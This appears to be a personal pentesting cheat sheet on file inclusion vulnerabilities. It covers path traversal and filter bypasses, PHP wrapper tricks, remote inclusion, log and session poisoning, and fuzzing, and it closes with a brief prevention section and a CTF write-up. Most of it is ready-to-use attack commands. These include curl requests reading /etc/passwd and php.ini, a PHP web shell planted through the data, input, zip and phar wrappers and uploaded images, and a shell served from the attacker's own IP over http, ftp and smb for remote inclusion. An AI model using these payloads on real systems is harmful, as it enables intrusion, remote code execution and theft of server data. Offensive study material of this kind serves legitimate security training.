
The following table shows which functions may execute files and which only read file content:

|  Function 	     |   Read Content 	 |       Execute 	         |   Remote URL|
|----------------|-----------------------|------------------------|-----------------|
|PHP |			
|include()/include_once() 	  |  ✅ 	       |         ✅ 	       |                  ✅|
|require()/require_once() 	  |  ✅ 	         |       ✅ 	             |            ❌|
|file_get_contents() 	     |   ✅ 	           |     ❌ 	        |                 ✅|
|fopen()/file() 	          |      ✅ 	         |       ❌              |              ❌|
|NodeJS 			|
|fs.readFile() 	         |       ✅ 	       |         ❌ 	          |               ❌|
|fs.sendFile() 	            |    ✅ 	        |        ❌ 	           |              ❌|
|res.render() 	        |        ✅ 	           |     ✅ 	        |                 ❌|
|Java 			|
|include 	          |          ✅ 	        |        ❌ 	          |               ❌|
|import 	              |          ✅ 	    |            ✅ 	     |                    ✅|
|.NET 			|
|@Html.Partial() 	      |      ✅ 	             |   ❌ 	           |              ❌|
@Html.RemotePartial() 	        ✅ 	                ❌ 	           |              ✅|
|Response.WriteFile() 	     |   ✅ 	             |   ❌ 	                 |        ❌|
|include 	             |       ✅ 	             |   ✅ 	                 |        ✅|




! Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows. 


# Path Traversal


we read a file by specifying its absolute path (e.g. /etc/passwd). This would work if the whole input was used within the include() function without any additions, like the following example:

    include($_GET['get_parameter']);

However, in many occasions, web developers may append or prepend a string to the language parameter. For example:

```include("./languages/" . $_GET['language']);```

We can easily bypass this restriction by traversing directories using relative paths.  we can add ../ before our file name

So, we can use this trick to go back several directories until we reach the root path and then specify our absolute file path e.g. ../../../../etc/passwd



### Filename Prefix

In case our input is prefixed like this:

`include("lang_" . $_GET['language']);`

the output is: `lang_../../../path`

you can prepend your input with a / to ommit the error.


## Appended Extensions

Another very common example is when an extension is appended to the language parameter, as follows:


```include($_GET['language'] . ".php");```

so you have to bypass with something like input%00



## Basic Bypasses


#### Non-Recursive Path Traversal Filters

One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals.

```$language = str_replace('../', '', $_GET['language']);```


if we use `....//` ,  `..././` or `....\/` and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. `....\/`), or adding extra forward slashes (e.g. `....////`)


#### URL Encoding

Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. However, some of these filters may be bypassed by URL encoding



#### Approved Paths

Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the ./languages directory, as follows:
```
    if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
        include($_GET['language']);
    } else {
        echo 'Illegal path specified!';
    }
```
    
To bypass this, we may use : /languages/../../../../input



#### Appended Extension


As discussed in the previous section, some web applications append an extension to our input string (e.g. .php), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).



#### Path Truncation



In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after that will be ignored. 

it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.

 ```?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times```
 
 
 ```$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done```




#### Null Byte (%00)

PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.



## PHP Filters



[PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. 

`php://stdin` `php://stdout` `php://stderr` `php://memory` `php://filter` etc.


#### Input Filters

PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify.

Syntax is as follows:

`php://filter/parameters`

There are four different types of filters available for use, which are: 
- [String Filters](https://www.php.net/manual/en/filters.string.php), 
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), 
- [Compression Filters](https://www.php.net/manual/en/filters.compression.php),
- and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)



#### Standard PHP Inclusion

if you tried to include any php files through LFI,the included PHP file gets executed

This is where the base64 php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered. 


```php://filter/read=convert.base64-encode/resource=config```


    ! Tip 
    If the app appends .php at the end ,leave resource parameter for the end of the filter string
    this is if the app automatically appends .php in the end of the request ,else we will have to provide it


#### RCE with Data Wrapper



**! only available to use if the (allow_url_include) setting is enabled**

##### Test for allow_url_include
- include the PHP configuration file found at /etc/php/X.Y/apache2/php.ini for Apache 
- or at /etc/php/X.Y/fpm/php.ini for Nginx, where X.Y is your install PHP version


##### Exploit
```
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```



```$ echo '<?php system($_GET["cmd"]); ?>' | base64```


Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass commands to the web shell with &cmd=<COMMAND>: 
```
    $ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```



#### Input Wrapper

- **!depends on the allow_url_include setting**

- **Used for POST Requests**

Add the  web shell as POST data and pass  a GET parameter with the command to execute:

```$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid```


Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)

```$ curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input" ```



#### Expect Wrapper

- **Designed to execute commands**

- **expect is an external wrapper, so it needs to be manually installed and enabled**

```$ echo '<base64 encoded php.ini>' | base64 -d | grep expect```

##### Exploit


```$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"```






## RFI





### Verify RFI


- **check for the allow_url_include setting**

```
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

- **include a local to the server file**

```
$ curl -X GET http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```


#### Get RCE with http

- Host the php web shell

```
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

$ sudo python3 -m http.server <LISTENING_PORT>
```

- Include the remote file to the server

```http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id```



#### Get RCE with ftp

```$ sudo python -m pyftpdlib -p 21```

```http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id```


If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'```


#### Get RCE with smb



```$ impacket-smbserver -smb2support share $(pwd)```

```http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami```




# LFI and File Uploads


- Image upload


`$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`

Note: We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary **that we would need to URL encode**.

- Find the path the image is saved

To include the uploaded file, we need to know the path to our uploaded file. In our case, if we inspect the source code


```<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">```


Note:  If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file

- Include the image


```http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id```




#### Zip Wrapper

**this wrapper isn't enabled by default**

- If zip upload is allowed

``$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.zip shell.php``

- If the app blocks zip uploads by extension

``$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php``


- Include the file with the zip wrapper

```http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id```




## Phar Wrapper


write the following PHP script into a shell.php file:
```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:
```
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
we can call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id)

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```





## Log Poisoning




#### PHP Session Poisoning

the web application can keep track of user details through their cookies. These details are stored in: 
- `/var/lib/php/sessions/` on ***Linux*** 
- `C:\Windows\Temp\` on ***Windows***.


the filename follows this name convention:

` name = sess_+{PHPSESSID}`

- include this session file 

```http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd```

- Poison arbitary values present in the file to confirm the log_poisoning attack

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

- Poison the file with php code (URL Encoded)

```http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E```

- Include to execute the code

```http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd```




#### Server Log Poisoning


- Apache logs:
    - /var/log/apache2/ on ***Linux***
    - C:\xampp\apache\logs\ on ***Windows*** 

- Nginx logs: 
    - /var/log/nginx/ on ***Linux*** 
    - C:\nginx\log\ on ***Windows***




The logs ussually contains: 
- the remote IP address, 
- request page, 
- response code,
-  the User-Agent header (possibly poisonable)


##### Exploit 

```http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log```



Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. 


- Other possible targets

    - /var/log/sshd.log
    - /var/log/mail
    - /var/log/vsftpd.log





## Automated Scanning


- Fuzzing Parameters

```$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287```


Tip: For a more precise scan, we can limit our scan to the most popular LFI parameters found on:

https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters




#### LFI wordlists


(https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)


```$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287```


#### Fuzzing Server Files


- Server Webroot


We may need to know the full server webroot path 


To do so, we can fuzz for the index.php file 
through common webroot paths, which we can find in this [wordlist]( https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt ) for Linux or this [wordlist](  https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt  ) for Windows. 


```$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287```









# File Inclusion Prevention

- avoid passing any user-controlled inputs into any file inclusion functions
- Whenever any of these functions is used, we should ensure that no user input is directly going into them
-  utilize a limited whitelist of allowed user inputs
    - create a whitelist that contains all existing paths used in the front-end
    - match each input string against it
- sanitize the user input to **recursively** remove any attempts of traversing directories
```
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

- set `allow_url_fopen` and `allow_url_include` to Off if possible
- dissalow access outside the basedir
    - adding `open_basedir = /var/www` in the `php.ini` file




# Examples


## SimpleWaf corctf_2022

[challenge](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/web/simplewaf)

[writeup](https://brycec.me/posts/corctf_2022_challenges#simplewaf)


`'The first step is realizing that Express uses the qs npm module to provide req.query.file'`

this function in Node behaves like this:

Query string `?file[]='a'&file[]='b'` = `req.query.file = ['a','b']`

Query string `?file[a]='b'&file[c]='d'` = `req.query.file = {"a":"b" , "c" :"d" }


Also fs.readFileSync accepts strings, Urls and Buffer vars.

```
fs.readFileSync(new URL("file:///app/flag.txt")).toString() 
(output)
{flag.txt}
```

you can construct a URL in Node with the following elements:

-    .href exists
-    .origin exists
-    .protocol === 'file:'
-    .hostname === ''
-    .pathname  URL encoded (note: this needs to be double URL encoded since Express will already URL decode once)

like so :

`?file[href]=a&file[origin]=a&file[protocol]=file:&file[hostname]=&file[pathname]=/app/fl%2561g.txt`